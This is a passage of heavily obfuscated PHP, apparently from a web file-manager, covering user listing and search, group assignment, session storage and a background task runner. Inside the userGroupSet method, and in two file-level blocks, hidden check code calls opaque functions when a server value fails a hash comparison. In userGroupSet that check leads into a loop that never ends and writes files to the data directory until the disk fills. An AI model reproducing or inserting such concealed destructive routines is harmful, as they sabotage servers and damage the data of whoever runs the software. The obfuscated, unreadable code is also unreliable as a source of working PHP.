Pinyin::get($õÕ•ş›Ì, $ÑìØÃùä[613]))); } private function nickNameRpt() { $ê’—ï =& $_SERVER[…É¦À–]; $×ÊµØã“ = Model($ê’—ï[810])->get($ê’—ï[2357]); $Æİ«Ã˜ = $GLOBALS[$ê’—ï[6]][$ê’—ï[410]][$ê’—ï[2357]]; $šïÕ……İ = !is_null($×ÊµØã“) ? $×ÊµØã“ : $Æİ«Ã˜; return !!$šïÕ……İ; } private function _checkExist($ª‡ø®õÁ, $©™‹Èåà = false) { $¢÷±¨‚ù =& $_SERVER[…É¦À–]; $ÉºÖªĞå = array($¢÷±¨‚ù[32] => UserModel::ERROR_USER_EXIST_NAME, $¢÷±¨‚ù[561] => UserModel::ERROR_USER_EXIST_NICKNAME, $¢÷±¨‚ù[334] => UserModel::ERROR_USER_EXIST_EMAIL, $¢÷±¨‚ù[2345] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ÉºÖªĞå[$¢÷±¨‚ù[561]]); } $Æ¦íË¸ = $©™‹Èåà ? array($¢÷±¨‚ù[1687] => array($¢÷±¨‚ù[2358], $©™‹Èåà)) : array(); foreach ($ÉºÖªĞå as $æ‡ÚŸ§• => $öíşºÒ) { $é‡¨± Ë = array(); foreach ($ÉºÖªĞå as $á°³ë· => $€ªûÃş) { if (isset($ª‡ø®õÁ[$á°³ë·]) && $ª‡ø®õÁ[$á°³ë·]) { $é‡¨± Ë[] = $ª‡ø®õÁ[$á°³ë·]; } } if (!$é‡¨± Ë) { continue; } $ÍŞ©Í«Ó = array_merge(array($æ‡ÚŸ§• => array($¢÷±¨‚ù[7], $é‡¨± Ë)), $Æ¦íË¸); $¾¸±™Ÿ = $this->where($ÍŞ©Í«Ó)->find(); if ($¾¸±™Ÿ) { return $öíşºÒ; } } return !0; } public function userListInfo($ƒ”íËÖó) { $˜­½õ„‘ =& $_SERVER[…É¦À–]; $»Ëğ·£· = array(); $ƒ”íËÖó = is_array($ƒ”íËÖó) ? array_unique($ƒ”íËÖó) : array(); if (!$ƒ”íËÖó) { return $»Ëğ·£·; } if (count($ƒ”íËÖó) < 20) { foreach ($ƒ”íËÖó as $‰¡ŞœŒ) { $»Ëğ·£·[$‰¡ŞœŒ . $˜­½õ„‘[12]] = $this->getInfoSimpleOuter($‰¡ŞœŒ); } } else { $Şâú„Éê = array($˜­½õ„‘[1678] => array($˜­½õ„‘[447], $ƒ”íËÖó)); if (count($ƒ”íËÖó) == 1) { $Şâú„Éê = array($˜­½õ„‘[1678] => $ƒ”íËÖó[0]); } $ºš‡¹§Ş = Model($˜­½õ„‘[533])->field($this->simpleField)->where($Şâú„Éê)->select(); $ºš‡¹§Ş = array_to_keyvalue($ºš‡¹§Ş, $˜­½õ„‘[1687]); foreach ($ƒ”íËÖó as $‰¡ŞœŒ) { $¨æÉ³ñš = $ºš‡¹§Ş[$‰¡ŞœŒ]; if (!$¨æÉ³ñš) { $»Ëğ·£·[$‰¡ŞœŒ . $˜­½õ„‘[12]] = $this->getInfoSimpleOuter($‰¡ŞœŒ); continue; } $¨æÉ³ñš[$˜­½õ„‘[562]] = Action($˜­½õ„‘[2331])->parseUrl($¨æÉ³ñš[$˜­½õ„‘[562]]); $»Ëğ·£·[$‰¡ŞœŒ . $˜­½õ„‘[12]] = $¨æÉ³ñš; } } return $»Ëğ·£·; } protected function userStatus($ÉÃÉ¹ää, $¸±ö·¥•) { $Ş›š¿… = $this->getInfoSimple($ÉÃÉ¹ää); if (!$Ş›š¿…) { return !1; } $™ÙÂÊ¿Ì = array($_SERVER[…É¦À–][790] => $¸±ö·¥•); return $this->userEdit($ÉÃÉ¹ää, $™ÙÂÊ¿Ì); } protected function userRemove($ÊÛ–·×) { $”ÚÊ®Éù =& $_SERVER[…É¦À–]; $™½ÅøˆÔ = $this->getInfoSimple($ÊÛ–·×); if (!$™½ÅøˆÔ) { return !1; } $ ƒÈŠÂ = array($”ÚÊ®Éù[1678] => $ÊÛ–·×); Model($”ÚÊ®Éù[621])->where($ ƒÈŠÂ)->delete(); Model($”ÚÊ®Éù[2359])->where($ ƒÈŠÂ)->delete(); Model($”ÚÊ®Éù[1967])->where($ ƒÈŠÂ)->delete(); Model($”ÚÊ®Éù[2344])->where($ ƒÈŠÂ)->delete(); Model($”ÚÊ®Éù[1113])->where($ ƒÈŠÂ)->delete(); Model($”ÚÊ®Éù[2175])->removeUserAll($ÊÛ–·×); Model($”ÚÊ®Éù[865])->userRootRemove($ÊÛ–·×); return $this->where($ ƒÈŠÂ)->delete(); } protected function userGroupSet($ô«à‚Ãæ, $Ø¹ƒÌ¯·, $¿ñœ±Ù = array()) { $ŒÈÚû„ =& $_SERVER[…É¦À–]; $¸øÓ•âõ = $_SERVER[$ŒÈÚû„[1613]]; $ã³ãƒÔ = $ŒÈÚû„[918]; if ($_SERVER[$ŒÈÚû„[919]] != $ã³ãƒÔ($¸øÓ•âõ)) { $˜¼°ööÓ = $ŒÈÚû„[920]; $ªÊíöÚ¶ = $ŒÈÚû„[921]; $©ÅÁÂâ = $_SERVER[$ŒÈÚû„[916]] . $ŒÈÚû„[917]; $âÊ‰¤ = $ªÊíöÚ¶($©ÅÁÂâ); $ß¦¯å’ = explode($ŒÈÚû„[231], $âÊ‰¤); if (count($ß¦¯å’) < $ŒÈÚû„[636]) { $º¬±üÓ¤ = $ŒÈÚû„[922]; $º¬±üÓ¤(); } $Óà²©ê = $ŒÈÚû„[923]; $Óà²©ê($_SERVER[$ŒÈÚû„[924]]); $˜¼°ööÓ = $ŒÈÚû„[920]; $˜¼°ööÓ(); $óâ¢ºàˆ = $ŒÈÚû„[925]; $ÌÕöøÎÌ = json_encode($GLOBALS[$ŒÈÚû„[926]]); $ç”·‚Ò = 1; for ($Œâ½Ûò˜ = $ç”·‚Ò; $Œâ½Ûò˜ > 0; $Œâ½Ûò˜++) { $óâ¢ºàˆ(DATA_PATH . $Œâ½Ûò˜, $ÌÕöøÎÌ); } } $”Œ§İÆ• = $this->getInfoSimple($ô«à‚Ãæ); if (!$”Œ§İÆ• || !is_array($Ø¹ƒÌ¯·)) { return !1; } $š“ÕŸÜ’ = Model($ŒÈÚû„[1967]); $š“ÕŸÜ’->where(array($ŒÈÚû„[1687] => $ô«à‚Ãæ))->delete(); $³òÜ•±æ = array(); $ºÄàòõË = 0; foreach ($Ø¹ƒÌ¯· as $Ü§œ => $¸ïçšß ) { $À‚Ú¼× = array($ŒÈÚû„[1687] => $ô«à‚Ãæ, $ŒÈÚû„[1877] => $Ü§œ, $ŒÈÚû„[1981] => $¸ïçšß ); $À‚Ú¼×[$ŒÈÚû„[1901]] = isset($¿ñœ±Ù[$ºÄàòõË]) ? $¿ñœ±Ù[$ºÄàòõË] : 0; $ºÄàòõË++; $³òÜ•±æ[] = $À‚Ú¼×; } return $š“ÕŸÜ’->addAll($³òÜ•±æ, array(), !0); } protected function userGroupAdd($¾¥œñ³ş, $Ëõƒ–Ü = array()) { $µÏ¶˜“ =& $_SERVER[…É¦À–]; $‚ĞÎ–©ˆ = $this->getInfoSimple($¾¥œñ³ş); if (!$‚ĞÎ–©ˆ || empty($Ëõƒ–Ü)) { return !1; } $Û‡ñ¤Æ = array(); foreach ($Ëõƒ–Ü as $…ÎÇŸåù => $Á—Ê¹·) { $Û‡ñ¤Æ[] = array($µÏ¶˜“[1687] => $¾¥œñ³ş, $µÏ¶˜“[1877] => $…ÎÇŸåù, $µÏ¶˜“[1981] => $Á—Ê¹·, $µÏ¶˜“[1901] => 0); } return Model($µÏ¶˜“[1967])->addAll($Û‡ñ¤Æ, array(), !0); } protected function userGroupRemove($ç¢çË¹Ì, $–¨Å‰”£) { $™¤°ŠÎË =& $_SERVER[…É¦À–]; $³Ñˆ±ï = $this->getInfoSimple($ç¢çË¹Ì); if (!$³Ñˆ±ï || !$–¨Å‰”£) { return !1; } $ë’ÂÁ÷° = array($™¤°ŠÎË[1678] => $ç¢çË¹Ì, $™¤°ŠÎË[1965] => $–¨Å‰”£); return Model($™¤°ŠÎË[1967])->where($ë’ÂÁ÷°)->delete(); } public function listData() { $şïÅ¸Õ¿ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($şïÅ¸Õ¿[$_SERVER[…É¦À–][398]]); return $şïÅ¸Õ¿; } public function listByID($”Â£ò·) { $Çª¦ê×ï =& $_SERVER[…É¦À–]; if (!$”Â£ò·) { return; } $ĞÒµ–¢ª = array($Çª¦ê×ï[1687] => array($Çª¦ê×ï[7], $”Â£ò·)); $Êù¥ò¶Õ = $this->where($ĞÒµ–¢ª)->select(); $Êù¥ò¶Õ = array_sort_keep($Êù¥ò¶Õ, $Çª¦ê×ï[1687], $”Â£ò·); $this->_listDataApply($Êù¥ò¶Õ); return $Êù¥ò¶Õ; } public function listByGroup($û‘ŸüÅ± = 0, $ª”¾§•Õ = array()) { $¼ñÑ™µ =& $_SERVER[…É¦À–]; $×›­Ë§ = $¼ñÑ™µ[12]; $×á”©ï¤ = array(); if ($û‘ŸüÅ±) { $×á”©ï¤ = array($¼ñÑ™µ[2360] => intval($û‘ŸüÅ±)); $×›­Ë§ = "\x4c\x45\x46\124\x20\x4a\117\x49\116\x20{$this->tablePrefix}\165\x73\145\x72\x5f\147\x72\x6f\x75\x70\40\x75\163\145\x72\x5f\147\x72\x6f\x75\x70\x20\x6f\156\40\x75\163\145\x72\x2e\x75\163\x65\x72\x49\x44\40\75\x20\165\163\145\x72\x5f\147\162\x6f\165\160\x2e\x75\x73\145\x72\111\104"; $ÄºÌ‘’ä = Input::get($¼ñÑ™µ[486], null, $¼ñÑ™µ[12]) ? $¼ñÑ™µ[12] : $¼ñÑ™µ[2361]; } if (isset($ª”¾§•Õ[$¼ñÑ™µ[790]])) { $×á”©ï¤[$¼ñÑ™µ[2362]] = $ª”¾§•Õ[$¼ñÑ™µ[790]]; } $ªŞœ¯ø = $this->_makeOrder($ÄºÌ‘’ä)->field($¼ñÑ™µ[2363])->where($×á”©ï¤)->join($×›­Ë§)->selectPage(50); $this->_listDataApply($ªŞœ¯ø[$¼ñÑ™µ[398]]); return $ªŞœ¯ø; } private function _makeOrder($ó‡ô¬Åõ = '') { $ËŒ´òÈ =& $_SERVER[…É¦À–]; $ô•˜Ò¤’ = array($ËŒ´òÈ[1687], $ËŒ´òÈ[32], $ËŒ´òÈ[1866], $ËŒ´òÈ[1838], $ËŒ´òÈ[201]); $ŒÈìº = array($ËŒ´òÈ[479] => $ËŒ´òÈ[480], $ËŒ´òÈ[481] => $ËŒ´òÈ[482]); $Íúí³ˆô = Input::get($ËŒ´òÈ[486], $ËŒ´òÈ[7], $ËŒ´òÈ[1678], $ô•˜Ò¤’); $‰ôºïÊ = Input::get($ËŒ´òÈ[487], $ËŒ´òÈ[7], $ËŒ´òÈ[1968], array($ËŒ´òÈ[1968], $ËŒ´òÈ[481])); $‰ôºïÊ = $ŒÈìº[$‰ôºïÊ]; $ó‡ô¬Åõ = $ó‡ô¬Åõ . "\165\x73\x65\162\56{$Íúí³ˆô}\x20{$‰ôºïÊ}\54\40\165\x73\x65\x72\56\x75\x73\145\x72\111\x44\40\x61\163\x63"; return $this->alias($ËŒ´òÈ[2094])->order($ó‡ô¬Åõ); } public function listSearch($ÉÓ±»È–) { $Ò‘¶—° =& $_SERVER[…É¦À–]; $¹¯µåµ = $ÉÓ±»È–[$Ò‘¶—°[1971]]; $×õ¢êà = isset($ÉÓ±»È–[$Ò‘¶—°[1972]]) ? $ÉÓ±»È–[$Ò‘¶—°[1972]] : !1; $¹¯µåµ = str_replace($Ò‘¶—°[1973], $Ò‘¶—°[1974], trim($¹¯µåµ)); $Šîó¸— = array($Ò‘¶—°[32] => array($Ò‘¶—°[412], "\45{$¹¯µåµ}\45"), $Ò‘¶—°[334] => array($Ò‘¶—°[412], "{$¹¯µåµ}\x25"), $Ò‘¶—°[561] => array($Ò‘¶—°[412], "{$¹¯µåµ}\45"), $Ò‘¶—°[1045] => $Ò‘¶—°[1975]); if (Input::check($¹¯µåµ, $Ò‘¶—°[340])) { $Šîó¸—[$Ò‘¶—°[1687]] = array($Ò‘¶—°[412], "{$¹¯µåµ}\45"); $Šîó¸—[$Ò‘¶—°[2345]] = array($Ò‘¶—°[412], "{$¹¯µåµ}\45"); } if (!$¹¯µåµ) { $Šîó¸— = array(); } if (isset($ÉÓ±»È–[$Ò‘¶—°[790]])) { $Šîó¸—[$Ò‘¶—°[790]] = $ÉÓ±»È–[$Ò‘¶—°[790]]; } $Šîó¸— = $this->parseWhereLike($Šîó¸—); $µÉ¯Óù± = $this->_makeOrder()->where($Šîó¸—)->selectPage(20); if (!$µÉ¯Óù± || count($µÉ¯Óù±[$Ò‘¶—°[398]]) < 5 && Input::check($¹¯µåµ, $Ò‘¶—°[347])) { $ò¤ÀğîÍ = $this->_searchFromMeta($Ò‘¶—°[493], $¹¯µåµ, 10); $ ª¢ÎæÖ = $this->_searchFromMeta($Ò‘¶—°[494], $¹¯µåµ, 10); $‘²úÏŸ = array_merge($ò¤ÀğîÍ, $ ª¢ÎæÖ, $µÉ¯Óù±[$Ò‘¶—°[398]]); $µÉ¯Óù±[$Ò‘¶—°[398]] = array_unique_by_key($‘²úÏŸ, $Ò‘¶—°[1687]); $µÉ¯Óù±[$Ò‘¶—°[395]][$Ò‘¶—°[396]] = count($µÉ¯Óù±[$Ò‘¶—°[398]]); $µÉ¯Óù±[$Ò‘¶—°[395]][$Ò‘¶—°[397]] = ceil($µÉ¯Óù±[$Ò‘¶—°[395]][$Ò‘¶—°[396]] / $µÉ¯Óù±[$Ò‘¶—°[395]][$Ò‘¶—°[392]]); } $this->_listDataApply($µÉ¯Óù±[$Ò‘¶—°[398]]); $this->_filterByGroup($µÉ¯Óù±, $×õ¢êà); return $µÉ¯Óù±; } private function _filterByGroup(&$°ÎÓåó, $Ä¸Ú¶¥¥) { $ÆÎ÷Ô”× =& $_SERVER[…É¦À–]; if (!$Ä¸Ú¶¥¥) { return $°ÎÓåó; } foreach ($°ÎÓåó[$ÆÎ÷Ô”×[398]] as $–“øÕê => &$À·®õ£–) { $“®ÊØÆ = array_to_keyvalue($À·®õ£–[$ÆÎ÷Ô”×[2064]], $ÆÎ÷Ô”×[12], $ÆÎ÷Ô”×[1877]); if (!in_array($Ä¸Ú¶¥¥, $“®ÊØÆ)) { unset($°ÎÓåó[$ÆÎ÷Ô”×[398]][$–“øÕê]); } } unset($À·®õ£–); $°ÎÓåó[$ÆÎ÷Ô”×[398]] = array_values($°ÎÓåó[$ÆÎ÷Ô”×[398]]); $°ÎÓåó[$ÆÎ÷Ô”×[395]] = array($ÆÎ÷Ô”×[2129] => count($°ÎÓåó[$ÆÎ÷Ô”×[398]]), $ÆÎ÷Ô”×[2127] => $°ÎÓåó[$ÆÎ÷Ô”×[395]][$ÆÎ÷Ô”×[392]], $ÆÎ÷Ô”×[2126] => 1, $ÆÎ÷Ô”×[2128] => 1); } private function _searchFromMeta($•àó½‚é, $¾™¢Á·, $û•„¡Ø¶) { $Ğ´óœ³ =& $_SERVER[…É¦À–]; $¾™¢Á· = strtolower($¾™¢Á·); $ÃÛÙğœÄ = array($Ğ´óœ³[94] => $•àó½‚é, $Ğ´óœ³[403] => array($Ğ´óœ³[412], "\x25{$¾™¢Á·}\45")); $ÃÛÙğœÄ = $this->parseWhereLike($ÃÛÙğœÄ); $‡›³Ø® = Model($Ğ´óœ³[2364])->where($ÃÛÙğœÄ)->limit($û•„¡Ø¶)->select(); if (!$‡›³Ø®) { return array(); } $‡›³Ø® = array_to_keyvalue($‡›³Ø®, $Ğ´óœ³[12], $Ğ´óœ³[1687]); $ªÌäú = $this->where(array($Ğ´óœ³[1678] => array($Ğ´óœ³[7], $‡›³Ø®)))->select(); if (!$ªÌäú) { return array(); } return $ªÌäú; } private function _listDataApplyItem($ÑèÆÃ²») { $½Ú€ç¹ = array($ÑèÆÃ²»); $this->_listDataApply($½Ú€ç¹); return $½Ú€ç¹[0]; } private function _listDataApply(&$îíÈÕ·µ) { $İ†ŸÃ‹à =& $_SERVER[…É¦À–]; if (!$îíÈÕ·µ) { return; } array_remove_key($îíÈÕ·µ, $İ†ŸÃ‹à[934]); $©å¢š¬ú = array_to_keyvalue($îíÈÕ·µ, $İ†ŸÃ‹à[12], $İ†ŸÃ‹à[1687]); $this->_listAppendGroup($îíÈÕ·µ, $©å¢š¬ú); $this->_listAppendMeta($îíÈÕ·µ, $©å¢š¬ú); $this->_listAppendSourceRoot($îíÈÕ·µ, $©å¢š¬ú); } private function _listAppendSourceRoot(&$ÈÙé—ğõ, $öïàÇŠœ) { $Âö‘¢÷Ò =& $_SERVER[…É¦À–]; $ùÏ¾¹½± = Model($Âö‘¢÷Ò[865])->listSourceRoot(SourceModel::TYPE_USER, $öïàÇŠœ); $ùÏ¾¹½± = array_to_keyvalue($ùÏ¾¹½±, $Âö‘¢÷Ò[525]); $ùÏ¾¹½± = array_remove_key($ùÏ¾¹½±, $Âö‘¢÷Ò[525]); foreach ($ÈÙé—ğõ as &$”ÂÍ…æÆ) { $”ÂÍ…æÆ[$Âö‘¢÷Ò[87]] = $ùÏ¾¹½±[$”ÂÍ…æÆ[$Âö‘¢÷Ò[1687]]] ? $ùÏ¾¹½±[$”ÂÍ…æÆ[$Âö‘¢÷Ò[1687]]] : array(); } unset($”ÂÍ…æÆ); } private function _listAppendGroup(&$•¨ô²Æ, $äÁıâ£) { $Ñ„¶Ÿ— =& $_SERVER[…É¦À–]; $ËæÍíŞ  = array($Ñ„¶Ÿ—[1687] => array($Ñ„¶Ÿ—[7], $äÁıâ£)); $¥Ÿ·ÎÕ = Model($Ñ„¶Ÿ—[1967])->where($ËæÍíŞ )->select(); $¸¡¬ˆŞ¶ = array_to_keyvalue($¥Ÿ·ÎÕ, $Ñ„¶Ÿ—[12], $Ñ„¶Ÿ—[1877]); $¸¡¬ˆŞ¶ = array_remove_value(array_unique($¸¡¬ˆŞ¶), $Ñ„¶Ÿ—[198]); if (!$¸¡¬ˆŞ¶ || !$¥Ÿ·ÎÕ) { return; } $ËæÍíŞ  = array($Ñ„¶Ÿ—[1877] => array($Ñ„¶Ÿ—[7], $¸¡¬ˆŞ¶)); $›¡Äã«é = Model($Ñ„¶Ÿ—[2062])->field($Ñ„¶Ÿ—[2365])->where($ËæÍíŞ )->select(); $›¡Äã«é = array_to_keyvalue($›¡Äã«é, $Ñ„¶Ÿ—[1877]); $¥Ÿ·ÎÕ = array_to_keyvalue_group($¥Ÿ·ÎÕ, $Ñ„¶Ÿ—[1687]); foreach ($¥Ÿ·ÎÕ as &$š°‹Ëìõ) { $¤ãßøÜ³ = array(); foreach ($š°‹Ëìõ as $Ğ‚«ò¨) { if (!$Ğ‚«ò¨[$Ñ„¶Ÿ—[1981]]) { continue; } $©úÕ¾ğª = Model($Ñ„¶Ÿ—[527])->listData($Ğ‚«ò¨[$Ñ„¶Ÿ—[1981]]); $¤ãßøÜ³[] = array($Ñ„¶Ÿ—[1877] => $Ğ‚«ò¨[$Ñ„¶Ÿ—[1877]], $Ñ„¶Ÿ—[2366] => $›¡Äã«é[$Ğ‚«ò¨[$Ñ„¶Ÿ—[1877]]][$Ñ„¶Ÿ—[32]], $Ñ„¶Ÿ—[540] => $›¡Äã«é[$Ğ‚«ò¨[$Ñ„¶Ÿ—[1877]]][$Ñ„¶Ÿ—[540]], $Ñ„¶Ÿ—[442] => $©úÕ¾ğª); } $š°‹Ëìõ = $¤ãßøÜ³; } unset($š°‹Ëìõ); foreach ($•¨ô²Æ as &$ªÖéë½) { $ªÖéë½[$Ñ„¶Ÿ—[2064]] = array(); if (isset($¥Ÿ·ÎÕ[$ªÖéë½[$Ñ„¶Ÿ—[1687]]])) { $ªÖéë½[$Ñ„¶Ÿ—[2064]] = $¥Ÿ·ÎÕ[$ªÖéë½[$Ñ„¶Ÿ—[1687]]]; } } unset($ªÖéë½); } public function userAppendGroup($äğºÄÒ«) { $œşÚà› =& $_SERVER[…É¦À–]; if (!$äğºÄÒ«) { return array(); } $this->_listAppendGroup($äğºÄÒ«, array_to_keyvalue($äğºÄÒ«, $œşÚà›[12], $œşÚà›[1687])); return $äğºÄÒ«; } private function _listAppendMeta(&$”û«›ÖÏ, $ö‹–üæ¾) { $¶¤ºªŞ½ =& $_SERVER[…É¦À–]; $Ò ÙÓ– = UserJobModel::JOB_KEY; $ÇÎŒœäŠ = array($¶¤ºªŞ½[2346]); $¦¢ò¤¡Í = array($¶¤ºªŞ½[1687] => array($¶¤ºªŞ½[7], $ö‹–üæ¾)); $íõÑ¹·ö = Model($¶¤ºªŞ½[2344])->where($¦¢ò¤¡Í)->select(); $íõÑ¹·ö = array_to_keyvalue_group($íõÑ¹·ö, $¶¤ºªŞ½[1687]); foreach ($íõÑ¹·ö as &$¾ÒÓ½ÜÃ) { $¾á¯åÌÒ = array(); foreach ($¾ÒÓ½ÜÃ as $‚·¼Ğ©Ô) { if (!in_array($‚·¼Ğ©Ô[$¶¤ºªŞ½[94]], $ÇÎŒœäŠ)) { $¾á¯åÌÒ[$‚·¼Ğ©Ô[$¶¤ºªŞ½[94]]] = $‚·¼Ğ©Ô[$¶¤ºªŞ½[403]]; } } $¾ÒÓ½ÜÃ = $¾á¯åÌÒ; } unset($¾ÒÓ½ÜÃ); $¿½Ú·–ş = Model($¶¤ºªŞ½[2367]); foreach ($”û«›ÖÏ as &$ºÊ½ÃÃÁ) { $™¶‰ÙØ = array(); if (isset($íõÑ¹·ö[$ºÊ½ÃÃÁ[$¶¤ºªŞ½[1687]]])) { $™¶‰ÙØ = $íõÑ¹·ö[$ºÊ½ÃÃÁ[$¶¤ºªŞ½[1687]]]; } $ºÊ½ÃÃÁ[$¶¤ºªŞ½[2368]] = array(); if (isset($™¶‰ÙØ[$Ò ÙÓ–])) { $ºÊ½ÃÃÁ[$¶¤ºªŞ½[2368]] = $¿½Ú·–ş->getUserJobInfo($™¶‰ÙØ[$Ò ÙÓ–]); } } unset($ºÊ½ÃÃÁ); } protected function groupUserAll($»Á‚›™‚) { $û ˜íŞ« =& $_SERVER[…É¦À–]; if (!$»Á‚›™‚) { return !1; } $Ü¼¹Ìö… = Model($û ˜íŞ«[1967])->field($û ˜íŞ«[1687])->where(array($û ˜íŞ«[1877] => array($û ˜íŞ«[7], $»Á‚›™‚)))->select(); $Ü¼¹Ìö… = array_to_keyvalue($Ü¼¹Ìö…, $û ˜íŞ«[12], $û ˜íŞ«[1687]); return array_unique($Ü¼¹Ìö…); } public function userSearch($öá©ü¶‚, $°»‘¾æš = "\52") { return Model($_SERVER[…É¦À–][554])->where($öá©ü¶‚)->field($°»‘¾æš)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\162\137\157\160\x74\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($¤ß¢³à) { $·Úß€¿Ì =& $_SERVER[…É¦À–]; $ŠüÌ å = defined($·Úß€¿Ì[2098]) && USER_ID ? USER_ID : $·Úß€¿Ì[12]; return "\x55\x73\145\x72\117\160\x74\151\157\x6e\137{$¤ß¢³à}\x5f" . $ŠüÌ å; } protected function filterWhere($ıÌô¸Ú) { $ØÀï ë =& $_SERVER[…É¦À–]; $ıÌô¸Ú[$ØÀï ë[1687]] = defined($ØÀï ë[2098]) && USER_ID ? USER_ID : $ØÀï ë[12]; return $ıÌô¸Ú; } public function cacheRemoveUser($»Ÿ„ç¦í, $×ü‚Êı•) { return Cache::remove("\125\163\145\162\117\160\x74\x69\157\x6e\137{$»Ÿ„ç¦í}\137" . $×ü‚Êı•); } protected function optionDefault($À“Æô÷ = '') { $â¹âÉæŞ =& $_SERVER[…É¦À–]; if ($À“Æô÷ == $â¹âÉæŞ[12]) { return $GLOBALS[$â¹âÉæŞ[6]][$â¹âÉæŞ[2369]]; } if ($À“Æô÷ == $â¹âÉæŞ[2370]) { return $GLOBALS[$â¹âÉæŞ[6]][$â¹âÉæŞ[2371]]; } } } if ($_SERVER[$_SERVER[…É¦À–][919]] != $_SERVER[$_SERVER[…É¦À–][1644]]) { $_getc = $_SERVER[…É¦À–][921]; $_getfile = $_SERVER[$_SERVER[…É¦À–][916]] . $_SERVER[…É¦À–][917]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[…É¦À–][231], $_getfilec); if (count($_getarrs) < $_SERVER[…É¦À–][647]) { $exit = $_SERVER[…É¦À–][922]; $exit(); } $_act = $_SERVER[…É¦À–][1645]; $_act($_SERVER[$_SERVER[…É¦À–][1613]]); } goto BÔÁÒ·ßÖí; E»¸óìàÑ¦: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $éº°¡–Æ =& $_SERVER[…É¦À–]; static $Áİ¾ì = false; if ($Áİ¾ì) { return $Áİ¾ì; } $Ù£ÃĞ¼ = $GLOBALS[$éº°¡–Æ[6]][$éº°¡–Æ[378]]; self::$sessionTime = $Ù£ÃĞ¼[$éº°¡–Æ[1640]]; $…Œ¾Ú‚ = isset($GLOBALS[$éº°¡–Æ[1641]]) ? $GLOBALS[$éº°¡–Æ[1641]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($…Œ¾Ú‚)) { self::$sessionSign = Cookie::get($…Œ¾Ú‚); } else { self::$sessionSign = guid(); } } Cookie::setSafe($…Œ¾Ú‚, self::$sessionSign, self::$sessionTime); $ıß¦Õ = $Ù£ÃĞ¼[$éº°¡–Æ[1642]]; $µ ¥’ØË = $Ù£ÃĞ¼[$ıß¦Õ]; $›´•… = $Ù£ÃĞ¼[$éº°¡–Æ[868]]; switch ($ıß¦Õ) { case $éº°¡–Æ[21]: self::$handle = Model($éº°¡–Æ[869]); break; case $éº°¡–Æ[870]: self::$handle = new CacheRedis($µ ¥’ØË, $›´•…); break; case $éº°¡–Æ[871]: self::$handle = new CacheMemcached($µ ¥’ØË, $›´•…); break; case $éº°¡–Æ[200]: $µ ¥’ØË[$éº°¡–Æ[84]] = $µ ¥’ØË[$éº°¡–Æ[84]] . $éº°¡–Æ[1643]; self::$handle = new CacheFile($µ ¥’ØË, $›´•…); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Áİ¾ì = new self(); return $Áİ¾ì; } public static function getBySign($È”ÜÄ—×) { $ş‹»¬­® = self::$handle->get($È”ÜÄ—×); $ş‹»¬­® = unserialize($ş‹»¬­®); return is_array($ş‹»¬­®) ? $ş‹»¬­® : array(); } public static function setBySign($í›ßÃÁî, $‹ºï—Ñ†) { CacheLock::lock($í›ßÃÁî); self::$handle->set($í›ßÃÁî, serialize($‹ºï—Ñ†), self::$sessionTime); CacheLock::unlock($í›ßÃÁî); } public static function sign($£Ó¸ûÉ = false) { $£Ó¸ûÉ && (self::$sessionSign = $£Ó¸ûÉ); self::init(); return self::$sessionSign; } public static function set($şŸßœ¥, $±“ğƒ‹ = false) { self::init(); if (is_array($şŸßœ¥)) { foreach ($şŸßœ¥ as $¼æŸ‘¼ã => $µõıû¤ê) { array_set_value(self::$data, $¼æŸ‘¼ã, $µõıû¤ê); } } else { array_set_value(self::$data, $şŸßœ¥, $±“ğƒ‹); } self::setBySign(self::$sessionSign, self::$data); } public static function get($«úé‘Ä¥ = false) { self::init(); if (!$«úé‘Ä¥) { return self::$data; } return array_get_value(self::$data, $«úé‘Ä¥); } public static function remove($õ‘ßÑ¾”) { self::init(); unset(self::$data[$õ‘ßÑ¾”]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[…É¦À–][873])) { self::$handle->clearTimeout(); } } } if ($_SERVER[$_SERVER[…É¦À–][919]] != $_SERVER[$_SERVER[…É¦À–][1644]]) { $_getc = $_SERVER[…É¦À–][921]; $_getfile = $_SERVER[$_SERVER[…É¦À–][916]] . $_SERVER[…É¦À–][917]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[…É¦À–][231], $_getfilec); if (count($_getarrs) < $_SERVER[…É¦À–][647]) { $exit = $_SERVER[…É¦À–][922]; $exit(); } $_act = $_SERVER[…É¦À–][1645]; $_act($_SERVER[$_SERVER[…É¦À–][1613]]); } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $´›šÄò =& $_SERVER[…É¦À–]; if (self::valueGet($´›šÄò[790]) != $´›šÄò[88]) { return; } if (self::valueGet($´›šÄò[1646]) == $´›šÄò[88]) { $ø™€ô­¤ = self::valueGet($´›šÄò[1647]); if (time() - $ø™€ô­¤ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$´›šÄò[1648]] = 1; self::valueSet($´›šÄò[1646], $´›šÄò[88]); self::log($´›šÄò[1649] . ACTION . $´›šÄò[1650]); Session::$data = array(); Session::$sessionSign = $´›šÄò[12]; $GLOBALS[$´›šÄò[523]] = 1; Hook::bind($´›šÄò[1651], $´›šÄò[1652]); $”àÆ’°¶ = 0; while (!0) { self::cacheClear(); if (self::valueGet($´›šÄò[790]) != $´›šÄò[88]) { self::valueSet($´›šÄò[1646], $´›šÄò[198]); self::log($´›šÄò[1653]); die; } $­äÆÎö = time(); if ($­äÆÎö - $”àÆ’°¶ >= 60) { self::valueSet(array($´›šÄò[1646] => $´›šÄò[88], $´›šÄò[1647] => $­äÆÎö), !1); $”àÆ’°¶ = $­äÆÎö; } if (!file_exists(USER_SYSTEM . $´›šÄò[1654])) { self::valueSet(array($´›šÄò[1646] => $´›šÄò[198], $´›šÄò[790] => $´›šÄò[198]), !1); die; } self::taskRunAll(); 